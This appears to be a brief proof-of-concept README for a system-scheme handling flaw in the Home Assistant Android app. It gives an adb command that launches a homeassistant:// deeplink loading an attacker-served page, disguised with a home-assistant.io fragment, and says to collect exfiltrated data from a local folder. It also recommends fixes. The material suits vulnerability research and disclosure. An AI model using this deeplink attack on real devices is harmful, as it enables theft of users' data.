# 2.3.2_Insecure_System_Scheme_Handling - System Scheme Exploit

## Vulnerability
tel:/sms:/mailto:/geo: auto-launch without confirmation

## Exploit
1. Start server: `python server.py`
2. Trigger deeplink:
```
adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/2.3.2_Insecure_System_Scheme_Handling.html%23home-assistant.io"
```
3. Check `received/` for exfiltrated data

## Fixed Version
Implement proper origin validation, user confirmation dialogs, and restrict vulnerability scope.
